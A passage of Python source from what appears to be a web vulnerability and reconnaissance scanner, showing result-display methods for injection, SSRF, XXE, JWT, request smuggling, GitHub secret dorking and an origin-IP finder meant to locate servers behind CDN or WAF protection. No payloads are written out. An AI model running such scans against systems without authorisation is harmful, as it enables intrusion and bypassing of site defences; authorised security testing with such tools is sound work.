                    cookie,
                    "Yes" if info.get('secure') else "[red]No[/red]",
                    "Yes" if info.get('httponly') else "[red]No[/red]",
                    info.get('samesite', 'N/A'),
                    issues if issues else "None"
                )
            console.print(c_table)
    
    def _scan_javascript(self):
        """JavaScript Sensitive Data Extractor - Zylon Custom"""
        console.print(f"\n[bold cyan][*] JavaScript Sensitive Data Extraction on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Extracting sensitive data from JavaScript...[/bold cyan]"):
            result = self.web.extract_js_secrets(url)
        
        self.results['findings']['javascript'] = result
        
        if result:
            j_table = Table(title="Sensitive Data in JavaScript", box=box.ROUNDED, border_style="red")
            j_table.add_column("Type", style="yellow")
            j_table.add_column("Value", style="red")
            j_table.add_column("Source", style="cyan")
            for finding in result.get('findings', []):
                j_table.add_row(
                    finding.get('type', ''),
                    finding.get('value', '')[:60],
                    finding.get('source', '')[:50]
                )
            console.print(j_table)
        else:
            console.print("[bold green][+] No sensitive data found in JavaScript files[/bold green]")
    
    def _scan_cloudbuckets(self):
        """Cloud Storage Bucket Detector - Zylon Custom"""
        console.print(f"\n[bold cyan][*] Cloud Storage Bucket Scan on {self.target}[/bold cyan]")
        
        with console.status("[bold cyan]Checking for exposed cloud storage...[/bold cyan]"):
            result = self.recon.detect_cloud_buckets(self.target)
        
        self.results['findings']['cloud_buckets'] = result
        
        if result and result.get('exposed'):
            console.print("[bold red][!] Exposed Cloud Storage Detected![/bold red]")
            b_table = Table(title="Exposed Buckets", box=box.HEAVY, border_style="red")
            b_table.add_column("Provider", style="yellow")
            b_table.add_column("Bucket URL", style="cyan")
            b_table.add_column("Status", style="red")
            for finding in result.get('findings', []):
                b_table.add_row(
                    finding.get('provider', ''),
                    finding.get('url', ''),
                    finding.get('status', '')
                )
            console.print(b_table)
        else:
            console.print("[bold green][+] No exposed cloud storage buckets detected[/bold green]")
    
    def _scan_waf(self):
        """WAF Detector - Zylon Custom"""
        console.print(f"\n[bold cyan][*] WAF Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Detecting Web Application Firewall...[/bold cyan]"):
            result = self.recon.detect_waf(url)
        
        self.results['findings']['waf'] = result
        
        if result and result.get('detected'):
            console.print(f"[bold yellow][*] WAF Detected: {result.get('name', 'Unknown')}[/bold yellow]")
            w_table = Table(title="WAF Information", box=box.ROUNDED, border_style="yellow")
            w_table.add_column("Property", style="yellow")
            w_table.add_column("Value", style="green")
            for key, val in result.items():
                w_table.add_row(key, str(val)[:80])
            console.print(w_table)
        else:
            console.print("[bold green][+] No WAF detected[/bold green]")
    
    def _scan_techstack(self):
        """Technology Stack Fingerprinter - Zylon Custom"""
        console.print(f"\n[bold cyan][*] Technology Fingerprinting on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        
        with console.status("[bold cyan]Fingerprinting technology stack...[/bold cyan]"):
            result = self.recon.fingerprint_tech(url)
        
        self.results['findings']['tech_stack'] = result
        
        if result:
            t_table = Table(title="Technology Stack", box=box.DOUBLE, border_style="bright_cyan")
            t_table.add_column("Category", style="yellow")
            t_table.add_column("Technology", style="green")
            t_table.add_column("Confidence", style="cyan")
            for tech in result.get('technologies', []):
                t_table.add_row(
                    tech.get('category', ''),
                    tech.get('name', ''),
                    f"{tech.get('confidence', 0)}%"
                )
            console.print(t_table)
    
    def _scan_fullvuln(self):
        """Full Vulnerability Assessment - All vulnerability scanners combined"""
        console.print(f"\n[bold red][*] Full Vulnerability Assessment on {self.target}[/bold red]")
        console.print("[bold yellow][*] This will run: SQLi + XSS + CORS + Open Redirect + CRLF + WordPress + WAF + Headers + SSL + Cookies[/bold yellow]")
        
        vuln_scans = [
            self._scan_headers, self._scan_ssl, self._scan_sqli,
            self._scan_xss, self._scan_cors, self._scan_openredirect,
            self._scan_crlf, self._scan_cookies, self._scan_waf, self._scan_wordpress,
        ]
        for scan_func in vuln_scans:
            try:
                saved_findings = self.results.get('findings', {})
                scan_func()
                new_findings = self.results.get('findings', {})
                saved_findings.update(new_findings)
                self.results['findings'] = saved_findings
            except Exception as e:
                console.print(f"[dim red][!] Error in {scan_func.__name__}: {str(e)[:60]}[/dim red]")
    
    def _scan_nuclear(self):
        """NUCLEAR SCAN - Everything combined (omino's nuke mode + wizard's full scan)"""
        console.print(f"\n[bold red][!!!] NUCLEAR SCAN INITIATED on {self.target}[/bold red]")
        console.print("[bold yellow][*] Running ALL modules... This may take a while.[/bold yellow]")
        
        # Run every single scan module with error recovery
        nuclear_scans = [
            self._scan_full_recon, self._scan_whois, self._scan_geoip,
            self._scan_dns, self._scan_subdomains, self._scan_ports,
            self._scan_banners, self._scan_headers, self._scan_ssl,
            self._scan_sqli, self._scan_xss, self._scan_dirbrute,
            self._scan_wordpress, self._scan_cors, self._scan_openredirect,
            self._scan_crlf, self._scan_cookies, self._scan_javascript,
            self._scan_cloudbuckets, self._scan_waf, self._scan_techstack,
        ]
        
        completed = 0
        errors = 0
        for scan_func in nuclear_scans:
            try:
                # Merge findings instead of overwriting
                saved_findings = self.results.get('findings', {})
                scan_func()
                # Merge new findings with saved
                new_findings = self.results.get('findings', {})
                saved_findings.update(new_findings)
                self.results['findings'] = saved_findings
                completed += 1
            except Exception as e:
                errors += 1
                console.print(f"[dim red][!] Error in {scan_func.__name__}: {str(e)[:80]}[/dim red]")
                continue
        
        # Generate comprehensive report
        try:
            self.reports.generate_html_report(self.results, self.target)
        except Exception as e:
            console.print(f"[yellow][!] Report generation error: {str(e)[:80]}[/yellow]")
        console.print(f"\n[bold green][+] NUCLEAR SCAN COMPLETE! {completed} succeeded, {errors} errors.[/bold green]")
    
    # ========================================================================
    # BUG BOUNTY ARSENAL - NEW SCAN IMPLEMENTATIONS
    # ========================================================================
    
    def _scan_deep_crawl(self):
        """Deep web crawler for URL discovery"""
        console.print(f"\n[bold cyan][*] Deep Crawling {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Spidering website...[/bold cyan]"):
            result = self.adv_recon.deep_crawl(url)
        self.results['findings']['deep_crawl'] = result
        console.print(f"[green][+] Discovered: {result['total_discovered']} URLs, {len(result['forms'])} forms, {len(result['api_endpoints'])} API endpoints, {len(result['js_files'])} JS files")
        if result.get('parameters'):
            p_table = Table(title="Discovered Parameters", box=box.ROUNDED, border_style="yellow")
            p_table.add_column("Parameter", style="yellow")
            p_table.add_column("Found In URLs", style="cyan")
            for param, urls in list(result['parameters'].items())[:20]:
                p_table.add_row(param, str(len(urls)))
            console.print(p_table)
    
    def _scan_param_mining(self):
        """Parameter mining for hidden parameters"""
        console.print(f"\n[bold cyan][*] Parameter Mining on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Mining hidden parameters...[/bold cyan]"):
            result = self.adv_recon.mine_parameters(url)
        self.results['findings']['param_mining'] = result
        if 'error' in result:
            console.print(f"[bold red][!] {result['error']}[/bold red]")
            return
        console.print(f"[green][+] Tested {result.get('tested', 0)} parameters, found {len(result.get('discovered', {}))} active, {len(result.get('reflected', []))} reflected")
        if result.get('discovered'):
            d_table = Table(title="Active Parameters", box=box.ROUNDED, border_style="yellow")
            d_table.add_column("Parameter", style="yellow")
            d_table.add_column("Hint", style="red")
            for param, info in result['discovered'].items():
                d_table.add_row(param, info.get('hint', ''))
            console.print(d_table)
    
    def _scan_wayback(self):
        """Wayback URL discovery"""
        console.print(f"\n[bold cyan][*] Wayback URL Discovery for {self.target}[/bold cyan]")
        with console.status("[bold cyan]Querying Wayback Machine...[/bold cyan]"):
            result = self.adv_recon.wayback_urls(self.target)
        self.results['findings']['wayback'] = result
        console.print(f"[green][+] Found {result['total']} historical URLs, {len(result.get('unique_params', []))} unique parameters")
    
    def _scan_google_dork(self):
        """Google dorking"""
        console.print(f"\n[bold cyan][*] Google Dorking {self.target}[/bold cyan]")
        with console.status("[bold cyan]Generating dork queries...[/bold cyan]"):
            result = self.adv_recon.google_dork(self.target)
        self.results['findings']['google_dork'] = result
        if result.get('findings'):
            g_table = Table(title=f"Google Dorks: {result['total']}", box=box.ROUNDED, border_style="yellow")
            g_table.add_column("Category", style="cyan")
            g_table.add_column("Severity", style="red")
            g_table.add_column("Dork", style="green")
            for f in result['findings'][:20]:
                g_table.add_row(f['category'], f['severity'], f['dork'][:60])
            console.print(g_table)
    
    def _scan_github_dork(self):
        """GitHub secret dorking"""
        console.print(f"\n[bold cyan][*] GitHub Secret Dorking for {self.target}[/bold cyan]")
        config_file = os.path.join(get_home(), '.zylon', 'config.json')
        api_token = None
        if os.path.exists(config_file):
            with open(config_file) as f:
                config = json.load(f)
            api_token = config.get('github_api_key', '')
        with console.status("[bold cyan]Searching GitHub for leaked secrets...[/bold cyan]"):
            result = self.adv_recon.github_dork(self.target, api_token)
        self.results['findings']['github_dork'] = result
        if result.get('findings'):
            console.print(f"[bold red][!] Found {result['total']} potential secret leaks on GitHub![/bold red]")
            for f in result['findings'][:10]:
                console.print(f"  [red]*[/red] {f.get('file', '')} in {f.get('repo', '')} - Severity: {f.get('severity', '')}")
        else:
            console.print("[green][+] No leaked secrets found on GitHub[/green]")
    
    def _scan_deep_js(self):
        """Deep JS analysis"""
        console.print(f"\n[bold cyan][*] Deep JS Analysis on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Analyzing JavaScript files...[/bold cyan]"):
            result = self.adv_recon.analyze_js_files(url)
        self.results['findings']['deep_js'] = result
        console.print(f"[green][+] Analyzed {result.get('files_analyzed', 0)} JS files")
        console.print(f"  Endpoints: {len(result.get('endpoints', []))}")
        console.print(f"  Secrets: {len(result.get('secrets', []))}")
        console.print(f"  Hidden Params: {len(result.get('hidden_params', []))}")
    
    def _scan_takeover(self):
        """Subdomain takeover check"""
        console.print(f"\n[bold cyan][*] Subdomain Takeover Check on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Discovering subdomains first...[/bold cyan]"):
            subs = self.recon.discover_subdomains(self.target)
        subdomain_list = list(subs.keys()) if isinstance(subs, dict) else list(subs)
        with console.status(f"[bold cyan]Checking {len(subdomain_list)} subdomains for takeover...[/bold cyan]"):
            result = self.adv_recon.check_subdomain_takeover(subdomain_list[:50])
        self.results['findings']['takeover'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!] {len(result['vulnerable'])} subdomains vulnerable to takeover![/bold red]")
            for v in result['vulnerable']:
                console.print(f"  [red]*[/red] {v['subdomain']} -> {v['service']} ({v['severity']})")
        else:
            console.print(f"[green][+] No subdomain takeover vulnerabilities ({result['total_tested']} checked)[/green]")
    
    def _scan_ssrf(self):
        """SSRF Scanner"""
        console.print(f"\n[bold red][*] SSRF Scan on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing for SSRF...[/bold cyan]"):
            result = self.injections.scan_ssrf(url)
        self.results['findings']['ssrf'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] SSRF Vulnerability Detected![/bold red]")
            for f in result['findings'][:10]:
                console.print(f"  [red]*[/red] Param: {f['parameter']} | Payload: {f['payload'][:40]} | Severity: {f.get('severity', '')}")
        else:
            console.print(f"[green][+] No SSRF detected ({result['tested_params']} params tested)[/green]")
    
    def _scan_ssti(self):
        """SSTI Scanner"""
        console.print(f"\n[bold red][*] SSTI Scan on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing for Template Injection...[/bold cyan]"):
            result = self.injections.scan_ssti(url)
        self.results['findings']['ssti'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!] SSTI Detected! Engine: {result.get('engine', 'Unknown')}[/bold red]")
            for f in result['findings'][:5]:
                console.print(f"  [red]*[/red] {f['engine']} via param '{f['parameter']}' ({f['method']})")
        else:
            console.print(f"[green][+] No SSTI detected ({result['tested']} tests)[/green]")
    
    def _scan_lfi(self):
        """Path Traversal / LFI Scanner"""
        console.print(f"\n[bold red][*] Path Traversal / LFI Scan on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing for Path Traversal...[/bold cyan]"):
            result = self.injections.scan_path_traversal(url)
        self.results['findings']['lfi'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] Path Traversal / LFI Detected![/bold red]")
            for f in result['findings'][:10]:
                console.print(f"  [red]*[/red] Param: {f['parameter']} | Payload: {f['payload'][:40]}")
        else:
            console.print(f"[green][+] No LFI detected ({result['tested']} tests)[/green]")
    
    def _scan_xxe(self):
        """XXE Scanner"""
        console.print(f"\n[bold red][*] XXE Scan on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing for XXE...[/bold cyan]"):
            result = self.injections.scan_xxe(url)
        self.results['findings']['xxe'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] XXE Vulnerability Detected![/bold red]")
        else:
            console.print(f"[green][+] No XXE detected ({result['tested']} tests)[/green]")
    
    def _scan_idor(self):
        """IDOR Detector"""
        console.print(f"\n[bold red][*] IDOR Scan on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing for IDOR...[/bold cyan]"):
            result = self.injections.scan_idor(url)
        self.results['findings']['idor'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] IDOR Vulnerability Detected![/bold red]")
        else:
            console.print(f"[green][+] No IDOR detected ({result['tested']} tests)[/green]")
    
    def _scan_race(self):
        """Race Condition Tester"""
        console.print(f"\n[bold red][*] Race Condition Test on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Sending burst requests...[/bold cyan]"):
            result = self.injections.scan_race_condition(url)
        self.results['findings']['race_condition'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] Race Condition Detected![/bold red]")
        else:
            console.print(f"[green][+] No race condition detected ({result['requests_sent']} requests)[/green]")
    
    def _scan_proto_pollution(self):
        """Prototype Pollution Scanner"""
        console.print(f"\n[bold cyan][*] Prototype Pollution Scan on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing for Prototype Pollution...[/bold cyan]"):
            result = self.injections.scan_prototype_pollution(url)
        self.results['findings']['prototype_pollution'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] Prototype Pollution Detected![/bold red]")
        else:
            console.print(f"[green][+] No prototype pollution detected[/green]")
    
    def _scan_cache_poison(self):
        """Web Cache Poisoning"""
        console.print(f"\n[bold red][*] Cache Poisoning Test on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing for Cache Poisoning...[/bold cyan]"):
            result = self.adv_web.scan_cache_poisoning(url)
        self.results['findings']['cache_poisoning'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] Cache Poisoning Detected![/bold red]")
        else:
            console.print(f"[green][+] No cache poisoning detected ({result['tested']} tests)[/green]")
    
    def _scan_smuggling(self):
        """HTTP Request Smuggling"""
        console.print(f"\n[bold red][*] Request Smuggling Test on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing for Request Smuggling...[/bold cyan]"):
            result = self.adv_web.scan_request_smuggling(url)
        self.results['findings']['request_smuggling'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] Request Smuggling Detected![/bold red]")
        else:
            console.print(f"[green][+] No request smuggling detected ({result['tested']} tests)[/green]")
    
    def _scan_host_header(self):
        """Host Header Injection"""
        console.print(f"\n[bold red][*] Host Header Injection Test on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing Host Header Injection...[/bold cyan]"):
            result = self.adv_web.scan_host_header(url)
        self.results['findings']['host_header'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] Host Header Injection Detected![/bold red]")
        else:
            console.print(f"[green][+] No host header injection detected ({result['tested']} tests)[/green]")
    
    def _scan_jwt(self):
        """JWT Vulnerability Scanner"""
        console.print(f"\n[bold red][*] JWT Vulnerability Scan on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Analyzing JWT tokens...[/bold cyan]"):
            result = self.adv_web.scan_jwt(url)
        self.results['findings']['jwt'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] JWT Vulnerability Detected![/bold red]")
        if result.get('jwt_count', 0) == 0:
            console.print("[yellow][!] No JWT tokens found - try scanning an authenticated endpoint[/yellow]")
        else:
            console.print(f"[green][+] Analyzed {result['jwt_count']} JWT tokens ({result['tested']} tests)[/green]")
    
    def _scan_broken_auth(self):
        """Broken Authentication Detector"""
        console.print(f"\n[bold red][*] Broken Authentication Test on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing authentication mechanisms...[/bold cyan]"):
            result = self.adv_web.scan_broken_auth(url)
        self.results['findings']['broken_auth'] = result
        if result.get('vulnerable'):
            console.print("[bold red][!] Broken Authentication Detected![/bold red]")
        for f in result.get('findings', []):
            sev = f.get('severity', 'Medium')
            console.print(f"  [{'red' if sev == 'Critical' else 'yellow'}]*[/{'red' if sev == 'Critical' else 'yellow'}] {f.get('type', '')}: {f.get('note', '')}")
    
    # ========================================================================
    # ORIGIN IP FINDER SCAN IMPLEMENTATIONS
    # ========================================================================
    
    def _scan_origin_ip_quick(self):
        """Origin IP Finder - Quick scan with top techniques"""
        console.print(f"\n[bold magenta][*] Origin IP Finder (Quick) on {self.target}[/bold magenta]")
        console.print("[dim]Running top 7 techniques: DNS Mining, Subdomain Resolve, Cert Transparency, DNS History, Error Page Leak, CNAME Chain, CDN Detection[/dim]")
        
        with console.status("[bold magenta]Hunting for origin IP behind CDN/WAF...[/bold magenta]"):
            result = self.origin_ip.quick_find(self.target)
        
        self.results['findings']['origin_ip'] = result
        
        # Display CDN detection
        cdn = result.get('cdn_detection', {})
        if cdn.get('behind_cdn'):
            console.print(f"\n[bold yellow][*] CDN Detected: {cdn.get('cdn_provider', 'Unknown')}[/bold yellow]")
            for evidence in cdn.get('evidence', []):
                console.print(f"  [yellow]*[/yellow] {evidence}")
        else:
            console.print("\n[bold green][+] Target does not appear to be behind a CDN[/bold green]")
        
        # Display found origin IPs
        origin_ips = result.get('origin_ips', [])
        if origin_ips:
            ip_table = Table(
                title=f"[bold]Origin IP Candidates: {len(origin_ips)}[/bold]",
                box=box.HEAVY, border_style="bold magenta"
            )
            ip_table.add_column("IP", style="bold red")
            ip_table.add_column("Confidence", style="yellow")
            ip_table.add_column("Sources", style="cyan")
            ip_table.add_column("Type", style="magenta")
            ip_table.add_column("Verified", style="green")
            
            for candidate in origin_ips[:20]:
                confidence = candidate.get('confidence', 'low')
                conf_color = "green" if confidence == 'high' else "yellow" if confidence == 'medium' else "red"
                sources = ', '.join(candidate.get('sources', [])[:3])
                verified = candidate.get('verification', {}).get('verified', False)
                ip_type = candidate.get('ip_type', 'origin')
                ver_str = "[green]YES[/green]" if verified else "[red]NO[/red]"
                type_str = "ORIGIN" if ip_type == 'origin' else f"[dim]{ip_type}[/dim]"
                ip_table.add_row(
                    candidate.get('ip', ''),
                    f"[{conf_color}]{confidence}[/{conf_color}]",
                    sources[:60],
                    type_str,
                    ver_str
                )
            console.print(ip_table)
        else:
            console.print("[bold yellow][!] No verified origin IPs found[/bold yellow]")
        
        # Display infrastructure IPs (mail/DNS/SPF) for reference
        infra_ips = result.get('infrastructure_ips', [])
        if infra_ips:
            infra_table = Table(
                title=f"[dim]Infrastructure IPs (NOT origin): {len(infra_ips)}[/dim]",
                box=box.SIMPLE, border_style="dim"
            )
            infra_table.add_column("IP", style="dim")
            infra_table.add_column("Type", style="dim yellow")
            infra_table.add_column("Note", style="dim")
            for inf in infra_ips[:10]:
                infra_table.add_row(
                    inf.get('ip', ''),
                    inf.get('ip_type', ''),
                    inf.get('note', 'Infrastructure')
                )
            console.print(infra_table)
    
    def _scan_origin_ip_full(self):
        """Origin IP Finder - Full scan with all 22 techniques"""
        console.print(f"\n[bold magenta][*] Origin IP Finder (Full - 22 Techniques) on {self.target}[/bold magenta]")
        console.print("[dim]Running all 22 advanced origin IP discovery techniques...[/dim]")
        
        with console.status("[bold magenta]Running all 22 origin IP techniques... (this may take a minute)[/bold magenta]"):
            result = self.origin_ip.find_origin_ip(self.target)
        
        self.results['findings']['origin_ip'] = result
        
        # Display CDN detection
        cdn = result.get('cdn_detection', {})
        if cdn.get('behind_cdn'):
            console.print(f"\n[bold yellow][*] CDN Detected: {cdn.get('cdn_provider', 'Unknown')}[/bold yellow]")
            for evidence in cdn.get('evidence', []):
                console.print(f"  [yellow]*[/yellow] {evidence}")
        else:
            console.print("\n[bold green][+] Target does not appear to be behind a CDN[/bold green]")
        
        # Display technique results summary
        techniques = result.get('all_techniques', {})
        tech_table = Table(
            title="[bold]Technique Results Summary[/bold]",
            box=box.ROUNDED, border_style="cyan"
        )
        tech_table.add_column("Technique", style="yellow")
        tech_table.add_column("Status", style="green")
        tech_table.add_column("Findings", style="cyan")
        
        technique_names = {
            'dns_mining': 'DNS Record Mining',
            'cname_chain': 'CNAME Chain Following',
            'multi_resolver': 'Multi-Resolver Validation',
            'spf_dkim_dmarc': 'SPF/DKIM/DMARC Extract',
            'zone_transfer': 'DNS Zone Transfer (AXFR)',
            'dns_history': 'DNS Historical Records',
            'cert_transparency': 'Certificate Transparency',
            'subdomain_resolution': 'Subdomain Resolution',
            'web_archive': 'Web Archive History',
            'shodan': 'Shodan Search',
            'censys': 'Censys Search',
            'favicon_hash': 'Favicon Hash',
            'email_headers': 'Email Header IP Extract',
            'error_page_leak': 'Error Page IP Leak',
            'server_status': 'Server Status Mining',
            'sitemap_parse': 'Sitemap IP Parsing',
            'resource_leak': 'Resource IP Leak',
            'cloud_metadata': 'Cloud Metadata Detection',
            'asn_prefix': 'ASN/Prefix Lookup',
        }
        
        for tech_key, tech_name in technique_names.items():
            tech_data = techniques.get(tech_key, {})
            if isinstance(tech_data, dict) and 'error' in tech_data:
                status = "[red]Failed[/red]"
                findings = tech_data['error']
            elif isinstance(tech_data, list):
                status = "[green]Complete[/green]"
                findings = f"{len(tech_data)} results"
            elif isinstance(tech_data, dict):
                status = "[green]Complete[/green]"
                ip_count = len(tech_data.get('ips', tech_data.get('found_ips', tech_data.get('matching_hosts', []))))
                findings = f"{ip_count} IPs found" if ip_count > 0 else "No IPs found"
            else:
                status = "[dim]N/A[/dim]"
                findings = "-"
            tech_table.add_row(tech_name, status, str(findings)[:50])
        
        console.print(tech_table)
        
        # Display CDN IPs found
        cdn_ips = result.get('cdn_ips', [])
        if cdn_ips:
            console.print(f"\n[bold yellow]CDN/Proxy IPs Found: {len(cdn_ips)}[/bold yellow]")
            for cdn_ip in cdn_ips[:5]:
                console.print(f"  [yellow]*[/yellow] {cdn_ip.get('ip', '')} -> {cdn_ip.get('cdn_provider', 'Unknown')}")
        
        # Display verified origin IPs
        origin_ips = result.get('origin_ips', [])
        if origin_ips:
            ip_table = Table(
                title=f"[bold red]VERIFIED ORIGIN IP CANDIDATES: {len(origin_ips)}[/bold red]",
                box=box.HEAVY, border_style="bold red"
            )
            ip_table.add_column("IP", style="bold red")
            ip_table.add_column("Confidence", style="yellow")
            ip_table.add_column("Sources", style="cyan")
            ip_table.add_column("Type", style="magenta")
            ip_table.add_column("Verified", style="bold green")
            ip_table.add_column("Match Score", style="magenta")
            
            for candidate in origin_ips[:20]:
                confidence = candidate.get('confidence', 'low')
                conf_color = "green" if confidence == 'high' else "yellow" if confidence == 'medium' else "red"
                sources = ', '.join(candidate.get('sources', [])[:4])
                verified = candidate.get('verification', {}).get('verified', False)
                ver_str = "[bold green]VERIFIED[/bold green]" if verified else "[dim]Unverified[/dim]"
                match_score = candidate.get('verification', {}).get('response_similarity', 0)
                score_str = f"{match_score}%" if match_score else "N/A"
                ip_type = candidate.get('ip_type', 'origin')
                type_str = "[green]ORIGIN[/green]" if ip_type == 'origin' else f"[dim]{ip_type}[/dim]"
                ip_table.add_row(
                    candidate.get('ip', ''),
                    f"[{conf_color}]{confidence}[/{conf_color}]",
                    sources[:60],
                    type_str,
                    ver_str,
                    score_str
                )
            console.print(ip_table)
        else:
            console.print("[bold yellow][!] No verified origin IPs discovered (target may be well-protected)[/bold yellow]")
        
        # Display infrastructure IPs for reference
        infra_ips = result.get('infrastructure_ips', [])
        if infra_ips:
            console.print(f"\n[bold dim]Infrastructure IPs (NOT origin): {len(infra_ips)}[/bold dim]")
            for inf in infra_ips[:8]:
                console.print(f"  [dim]*[/dim] {inf.get('ip', '')} | {inf.get('ip_type', '')} | {inf.get('note', 'Infrastructure')}")
        
        # Display header fingerprint matches
        fp = result.get('header_fingerprint', {})
        if fp.get('ip_matches'):
            console.print(f"\n[bold cyan]Header Fingerprint Matches: {len(fp['ip_matches'])}[/bold cyan]")
            for match in fp['ip_matches']:
                console.print(f"  [cyan]*[/cyan] IP: {match.get('ip', '')} | Score: {match.get('match_score', 0)} | Details: {', '.join(match.get('details', []))}")
        
        # Display all candidate IPs
        all_candidates = result.get('all_candidate_ips', [])
        if all_candidates and len(all_candidates) > len(origin_ips):
            console.print(f"\n[bold dim]All Non-CDN IP Candidates: {len(all_candidates)} (showing top 10)[/bold dim]")
            for candidate in all_candidates[:10]:
                console.print(f"  [dim]*[/dim] {candidate.get('ip', '')} | {candidate.get('confidence', '')} | {len(candidate.get('sources', []))} sources")
    
    def _scan_cdn_detection(self):
        """CDN/WAF Detection & Fingerprinting"""
        console.print(f"\n[bold yellow][*] CDN/WAF Detection on {self.target}[/bold yellow]")
        
        with console.status("[bold yellow]Detecting CDN/WAF protection...[/bold yellow]"):
            result = self.origin_ip.detect_cdn(self.target)
        
        self.results['findings']['cdn_detection'] = result
        
        cdn_table = Table(
            title="CDN/WAF Detection Results",
            box=box.ROUNDED, border_style="yellow"
        )
        cdn_table.add_column("Property", style="yellow")
        cdn_table.add_column("Value", style="cyan")
        
        cdn_table.add_row("Behind CDN", "[red]YES[/red]" if result.get('behind_cdn') else "[green]NO[/green]")
        cdn_table.add_row("CDN Provider", result.get('cdn_provider', 'None detected'))
        cdn_table.add_row("Current IP", str(result.get('current_ip', 'Unknown')))
        
        console.print(cdn_table)
        
        if result.get('evidence'):
            console.print("\n[bold yellow]Evidence:[/bold yellow]")
            for evidence in result['evidence']:
                console.print(f"  [yellow]*[/yellow] {evidence}")
        
        if not result.get('behind_cdn'):
            console.print("\n[bold green][+] Target is NOT behind a CDN - the resolved IP is likely the origin[/bold green]")
        else:
            console.print("\n[bold red][!] Target IS behind CDN - use scan 50/51 to find the real origin IP[/bold red]")
    
    def _scan_dns_cert_hunt(self):
        """DNS History + Certificate Transparency IP Hunt"""
        console.print(f"\n[bold magenta][*] DNS History + Cert Transparency Hunt on {self.target}[/bold magenta]")
        
        with console.status("[bold magenta]Querying DNS history and certificate transparency logs...[/bold magenta]"):
            dns_history = self.origin_ip.dns_history_lookup(self.target)
            cert_results = self.origin_ip.cert_transparency_search(self.target)
        
        self.results['findings']['dns_cert_hunt'] = {
            'dns_history': dns_history,
            'cert_transparency': cert_results
        }
        
        # DNS History results
        if dns_history:
            h_table = Table(
                title="DNS History - Previous IPs",
                box=box.ROUNDED, border_style="magenta"
            )
            h_table.add_column("IP", style="red")
            h_table.add_column("Source", style="cyan")
            h_table.add_column("Details", style="yellow")
            for entry in dns_history[:20]:
                ip = entry.get('ip', '')
                source = entry.get('source', '')
                details = entry.get('first_seen', '') or entry.get('hostname', '')
                cdn = self.origin_ip._is_cdn_ip(ip)
                ip_display = f"{ip} [dim](CDN: {cdn})[/dim]" if cdn else f"[bold red]{ip}[/bold red]"
                h_table.add_row(ip_display, source, str(details)[:40])
            console.print(h_table)
        else:
            console.print("[bold yellow][!] No historical DNS records found[/bold yellow]")
        
        # Certificate Transparency results
        non_cdn_cert = [r for r in cert_results if not self.origin_ip._is_cdn_ip(r.get('ip', ''))]
        if non_cdn_cert:
            c_table = Table(
                title="Cert Transparency - Non-CDN IPs",
                box=box.ROUNDED, border_style="magenta"
            )
            c_table.add_column("IP", style="red")
            c_table.add_column("Hostname", style="cyan")
            c_table.add_column("Source", style="yellow")
            for entry in non_cdn_cert[:20]:
                c_table.add_row(
                    entry.get('ip', ''),
                    entry.get('hostname', ''),
                    entry.get('source', '')
                )
            console.print(c_table)
        else:
            console.print("[bold yellow][!] No non-CDN IPs found via certificate transparency[/bold yellow]")
    
    def _scan_subdomain_origin(self):
        """Subdomain Resolution + CDN IP Filtering"""
        console.print(f"\n[bold magenta][*] Subdomain Origin IP Hunt on {self.target}[/bold magenta]")
        
        with console.status("[bold magenta]Resolving subdomains and filtering CDN IPs...[/bold magenta]"):
            result = self.origin_ip.subdomain_resolution(self.target)
        
        self.results['findings']['subdomain_origin'] = result
        
        console.print(f"\n[bold cyan]Total subdomains discovered: {result.get('total_subdomains', 0)}[/bold cyan]")
        
        # Display non-CDN IPs (likely origin)
        non_cdn = result.get('non_cdn_ips', [])
        if non_cdn:
            s_table = Table(
                title=f"Non-CDN Origin IP Candidates: {len(non_cdn)}",
                box=box.HEAVY, border_style="bold magenta"
            )
            s_table.add_column("Subdomain", style="cyan")
            s_table.add_column("IP", style="bold red")
            for entry in non_cdn[:30]:
                s_table.add_row(entry.get('subdomain', ''), entry.get('ip', ''))
            console.print(s_table)
        else:
            console.print("[bold yellow][!] All resolved subdomains point to CDN IPs[/bold yellow]")
    
    def _scan_ip_verify(self):
        """Direct IP Verification with Host Header"""
        console.print(f"\n[bold magenta][*] Direct IP Verification on {self.target}[/bold magenta]")
        
        # First, get any known non-CDN IPs
        with console.status("[bold magenta]Quick scanning for candidate IPs first...[/bold magenta]"):
            quick = self.origin_ip.quick_find(self.target)
        
